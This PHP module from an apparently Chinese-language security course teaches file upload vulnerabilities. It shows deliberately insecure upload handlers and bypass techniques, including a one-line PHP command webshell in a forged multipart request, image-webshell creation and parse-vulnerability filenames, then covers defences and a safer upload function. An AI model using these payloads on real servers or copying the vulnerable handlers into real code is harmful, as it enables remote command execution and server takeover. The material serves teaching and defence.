<?php
$module_name = '文件上传漏洞基础';
$module_icon = '📚';
$module_desc = '学习文件上传漏洞的基本概念、类型、原理和防御方法。';

$content = <<<'EOT'
<div class="card">
    <div class="card-header">
        <h5 class="mb-0">📚 文件上传漏洞基础</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-info">
            <strong>💡 学习目标：</strong><br>
            理解文件上传漏洞的基本概念、攻击原理、常见类型和防御方法。
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📁 什么是文件上传漏洞？</h6>
            </div>
            <div class="card-body">
                <p><strong>文件上传漏洞</strong>是指应用程序在处理文件上传时，没有对上传的文件进行充分验证，导致攻击者可以上传恶意文件（如webshell）到服务器，从而执行恶意代码或获取服务器控制权。</p>
                
                <div class="row mt-3">
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🔍 核心原理</h6>
                                <p class="card-text">当应用程序允许用户上传文件但未对文件类型、内容、大小等进行严格验证时，攻击者可以上传包含恶意代码的文件并执行。</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🎯 攻击特点</h6>
                                <ul class="mb-0">
                                    <li>可以上传webshell</li>
                                    <li>可以执行系统命令</li>
                                    <li>可以获取服务器权限</li>
                                    <li>可以进一步渗透内网</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📊 文件上传攻击流程图</h6>
            </div>
            <div class="card-body">
                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[攻击者] -->|上传恶意文件| B[Web应用]
    B -->|文件验证| C{验证结果}
    C -->|验证通过| D[文件保存]
    C -->|验证失败| E[拒绝上传]
    D --> F[文件存储]
    A -->|访问恶意文件| F
    F -->|执行恶意代码| G[获取服务器权限]
    G --> H[进一步渗透]
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style G fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style H fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style E fill:#51cf66,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🏷️ 文件上传漏洞类型</h6>
            </div>
            <div class="card-body">
                <div class="accordion" id="uploadTypes">
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading1">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1">
                                🔴 无过滤上传
                            </button>
                        </h2>
                        <div id="collapse1" class="accordion-collapse collapse show" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>应用程序完全没有任何文件上传验证，攻击者可以直接上传任意类型的文件。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// 前端表单
&lt;form action="upload.php" method="POST" enctype="multipart/form-data"&gt;
    &lt;input type="file" name="file"&gt;
    &lt;input type="submit" value="上传"&gt;
&lt;/form&gt;

// 后端代码
$target_file = "uploads/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击步骤</h6>
                                                <ol class="mb-0">
                                                    <li>准备webshell文件（如shell.php）</li>
                                                    <li>直接上传到服务器</li>
                                                    <li>访问上传的webshell文件</li>
                                                    <li>执行系统命令</li>
                                                </ol>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant S as 服务器
        
        A->>S: 上传shell.php
        S->>S: 直接保存文件
        A->>S: 访问shell.php
        S->>S: 执行PHP代码
        S->>A: 返回执行结果
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading2">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2">
                                🟠 前端验证绕过
                            </button>
                        </h2>
                        <div id="collapse2" class="accordion-collapse collapse" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>应用程序仅在前端使用JavaScript验证文件类型，攻击者可以通过禁用JavaScript或直接构造请求绕过验证。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>前端验证代码</h6>
                                                <pre class="mb-0"><code>&lt;script&gt;
function checkFileType() {
    var file = document.getElementById('file').files[0];
    var ext = file.name.split('.').pop().toLowerCase();
    if (['jpg', 'jpeg', 'png', 'gif'].indexOf(ext) == -1) {
        alert('只能上传图片文件！');
        return false;
    }
    return true;
}
&lt;/script&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>绕过方法</h6>
                                                <ul class="mb-0">
                                                    <li>禁用浏览器JavaScript</li>
                                                    <li>使用Burp Suite拦截修改请求</li>
                                                    <li>直接构造POST请求</li>
                                                    <li>修改文件扩展名后上传</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading3">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3">
                                🟡 MIME类型绕过
                            </button>
                        </h2>
                        <div id="collapse3" class="accordion-collapse collapse" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>应用程序仅验证文件的Content-Type头，攻击者可以修改Content-Type为允许的类型来绕过验证。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>后端验证代码</h6>
                                                <pre class="mb-0"><code>$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die('只能上传图片文件！');
}
$target_file = "uploads/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>绕过方法</h6>
                                                <pre class="mb-0"><code>// 修改Content-Type为image/jpeg
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

&lt;?php system($_GET['cmd']); ?&gt;
------WebKitFormBoundary--</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading4">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4">
                                🟢 扩展名绕过
                            </button>
                        </h2>
                        <div id="collapse4" class="accordion-collapse collapse" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>应用程序使用黑名单方式验证文件扩展名，攻击者可以使用各种技巧绕过黑名单。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>后端验证代码</h6>
                                                <pre class="mb-0"><code>$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), $blacklist)) {
    die('禁止上传PHP文件！');
}
$target_file = "uploads/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>绕过方法</h6>
                                                <ul class="mb-0">
                                                    <li>使用双扩展名：shell.php.jpg</li>
                                                    <li>使用大小写混合：shell.PHP</li>
                                                    <li>使用空格或点：shell.php. 或 shell.php </li>
                                                    <li>使用PHP短标签：shell.pht</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading5">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse5">
                                🔵 图片马 + 文件包含
                            </button>
                        </h2>
                        <div id="collapse5" class="accordion-collapse collapse" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>攻击者上传包含PHP代码的图片文件（图片马），然后通过文件包含漏洞执行其中的代码。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>创建图片马</h6>
                                                <pre class="mb-0"><code>// 方法1：使用copy命令
copy normal.jpg /b + shell.php /a webshell.jpg

// 方法2：直接编辑图片文件
在图片文件末尾添加：
&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>执行图片马</h6>
                                                <pre class="mb-0"><code>// 通过文件包含执行
http://example.com/include.php?file=uploads/webshell.jpg

// 或通过解析漏洞执行
http://example.com/uploads/webshell.jpg.php</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading6">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse6">
                                🟣 解析漏洞
                            </button>
                        </h2>
                        <div id="collapse6" class="accordion-collapse collapse" data-bs-parent="#uploadTypes">
                            <div class="accordion-body">
                                <p>利用Web服务器或应用程序的文件解析漏洞来执行上传的文件。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>常见解析漏洞</h6>
                                                <ul class="mb-0">
                                                    <li>Apache解析漏洞：shell.php.jpg</li>
                                                    <li>IIS解析漏洞：shell.asp;.jpg</li>
                                                    <li>Nginx解析漏洞：shell.jpg%00.php</li>
                                                    <li>PHP CGI解析漏洞：shell.php/1.jpg</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// Apache解析漏洞
上传：shell.php.jpg
访问：http://example.com/uploads/shell.php.jpg

// IIS解析漏洞
上传：shell.asp;.jpg
访问：http://example.com/uploads/shell.asp;.jpg</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>⚠️ 文件上传漏洞的危害</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-danger">
                            <div class="card-header bg-danger text-white">
                                <h6 class="mb-0">🔴 服务器控制</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>执行系统命令</li>
                                    <li>获取服务器权限</li>
                                    <li>上传webshell</li>
                                    <li>建立持久访问</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-warning">
                            <div class="card-header bg-warning text-dark">
                                <h6 class="mb-0">🟠 数据泄露</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>读取敏感文件</li>
                                    <li>获取数据库凭证</li>
                                    <li>访问源代码</li>
                                    <li>窃取用户数据</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 横向移动</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>攻击内网服务</li>
                                    <li>渗透其他服务器</li>
                                    <li>绕过网络隔离</li>
                                    <li>扩大攻击范围</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 文件上传漏洞防御方法</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-6">
                        <div class="card h-100 border-success">
                            <div class="card-header bg-success text-white">
                                <h6 class="mb-0">✅ 核心防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>白名单验证：</strong>只允许特定文件类型</li>
                                    <li><strong>服务器端验证：</strong>不在前端进行验证</li>
                                    <li><strong>文件内容验证：</strong>验证文件实际内容</li>
                                    <li><strong>文件名处理：</strong>随机重命名上传文件</li>
                                    <li><strong>存储分离：</strong>上传文件存储在独立目录</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 辅助防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>权限设置：</strong>限制上传目录执行权限</li>
                                    <li><strong>WAF：</strong>使用Web应用防火墙</li>
                                    <li><strong>文件扫描：</strong>对上传文件进行病毒扫描</li>
                                    <li><strong>大小限制：</strong>限制上传文件大小</li>
                                    <li><strong>日志记录：</strong>记录文件上传行为</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[用户上传文件] --> B{服务器端验证}
    B -->|验证失败| C[拒绝上传]
    B -->|验证通过| D[随机重命名]
    D --> E[存储到安全目录]
    E --> F[返回访问路径]
    
    style B fill:#ffd43b,stroke:#333,stroke-width:2px
    style D fill:#51cf66,stroke:#333,stroke-width:2px,color:#fff
    style E fill:#51cf66,stroke:#333,stroke-width:2px,color:#fff
    style C fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>

                <div class="card bg-light mt-3">
                    <div class="card-body">
                        <h6>💡 防御代码示例</h6>
                        <pre class="mb-0"><code>// 安全的文件上传处理
function secure_upload($file) {
    // 1. 白名单验证文件类型
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_extensions)) {
        return false;
    }
    
    // 2. 验证文件内容
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($mime, $allowed_mimes)) {
        return false;
    }
    
    // 3. 随机重命名文件
    $new_filename = uniqid() . '.' . $ext;
    $upload_dir = __DIR__ . '/uploads/';
    $target_path = $upload_dir . $new_filename;
    
    // 4. 确保上传目录存在
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    // 5. 移动文件
    if (move_uploaded_file($file['tmp_name'], $target_path)) {
        return $new_filename;
    }
    
    return false;
}

// 使用示例
if (isset($_FILES['file'])) {
    $result = secure_upload($_FILES['file']);
    if ($result) {
        echo "文件上传成功：$result";
    } else {
        echo "文件上传失败";
    }
}</code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="../assets/js/mermaid.min.js"></script>
<script>
// 确保mermaid加载完成后再初始化
if (typeof mermaid !== 'undefined') {
    mermaid.initialize({
        startOnLoad: true,
        theme: 'default',
        flowchart: {
            useMaxWidth: true,
            htmlLabels: true,
            curve: 'basis'
        },
        sequence: {
            useMaxWidth: true,
            wrap: true
        }
    });
}

// 监听折叠面板展开事件
document.addEventListener('DOMContentLoaded', function() {
    const accordionItems = document.querySelectorAll('.accordion-collapse');
    accordionItems.forEach(collapse => {
        collapse.addEventListener('shown.bs.collapse', function() {
            // 重新渲染mermaid
            if (typeof mermaid !== 'undefined') {
                mermaid.run();
            }
        });
    });
});
</script>
EOT;

include '../template/module_template.php';
?>
